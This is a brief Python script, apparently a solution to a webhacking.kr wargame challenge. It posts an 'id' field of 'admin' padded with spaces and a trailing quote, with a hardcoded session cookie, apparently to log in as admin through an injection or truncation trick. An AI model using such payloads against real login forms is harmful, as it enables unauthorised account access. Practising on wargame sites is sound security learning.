import requests


url = "http://webhacking.kr/challenge/bonus/bonus-10/index.php"

params = {
	"id": "admin         '"
}

headers = {
	"Cookie":"PHPSESSID=b2f4afe01ffbb827e31f86bff992b61d;oldzombie=1",
	"Host":"webhacking.kr"
}

req = requests.post(url, data=params, headers=headers)
print req.content



